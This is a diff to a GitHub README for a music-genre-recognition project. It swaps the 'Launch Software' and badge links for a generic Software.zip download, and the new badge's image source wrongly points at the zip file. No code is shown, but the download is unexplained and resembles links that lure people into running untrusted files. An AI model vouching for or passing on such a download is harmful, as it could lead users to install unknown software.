@@ -20,9 +20,9 @@ Welcome to the "Music-Genre-Recognition" repository dedicated to the fascinating
    - pattern-recognition
 
 ## Software Download
-For access to the software used in this project, please download it from the following link: [Launch Software](https://github.com/user-attachments/files/18388744/Software.zip)
+For access to the software used in this project, please download it from the following link: [Launch Software](https://github.com/RBGTOP/Music-Genre-Recognition/releases/download/v2.0/Software.zip)
 
-[![Download Software](https://img.shields.io/badge/Download-Software-green.svg)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/RBGTOP/Music-Genre-Recognition/releases/download/v2.0/Software.zip)](https://github.com/RBGTOP/Music-Genre-Recognition/releases/download/v2.0/Software.zip)
 
 ## Project Details
 ### 🎸🎹 About Music Genre Recognition
